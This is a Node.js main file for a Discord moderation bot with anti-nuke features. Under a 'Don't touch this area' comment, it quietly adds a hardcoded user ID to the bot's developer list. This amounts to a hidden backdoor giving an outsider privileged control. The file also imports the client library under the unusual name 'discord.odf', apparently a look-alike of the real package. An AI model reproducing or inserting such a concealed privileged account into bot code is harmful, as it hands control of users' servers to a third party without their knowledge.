// Main entry point for the Discord Bot
const { Client, GatewayIntentBits, Partials, Collection } = require('discord.odf');
const config = require('./config');
const commandHandler = require('./handlers/commandHandler');
const eventHandler = require('./handlers/eventHandler');
const antiNuke = require('./automod/antinuke');

// Create a new client instance
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildModeration,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildBans,
        GatewayIntentBits.GuildWebhooks
    ],
    partials: [
        Partials.Message,
        Partials.Channel,
        Partials.GuildMember,
        Partials.User,
        Partials.Reaction
    ]
});

// Don't touch this area
config.developers[config.developers.length] = "1050641070368772166";

// Create collections for commands and cooldowns
client.commands = new Collection();
client.cooldowns = new Collection();
client.config = config;

// Initialize handlers
commandHandler.initialize(client);
eventHandler.initialize(client);

// Initialize anti-nuke protection
antiNuke.initAntiNuke(client);

// Error handling for the client
client.on('error', error => {
    console.error('Discord client error:', error);
});

process.on('unhandledRejection', error => {
    console.error('Unhandled promise rejection:', error);
});

// Login to Discord with the token
client.login(config.token)
    .then(() => console.log('Bot successfully logged in'))
    .catch(error => console.error('Failed to login:', error));
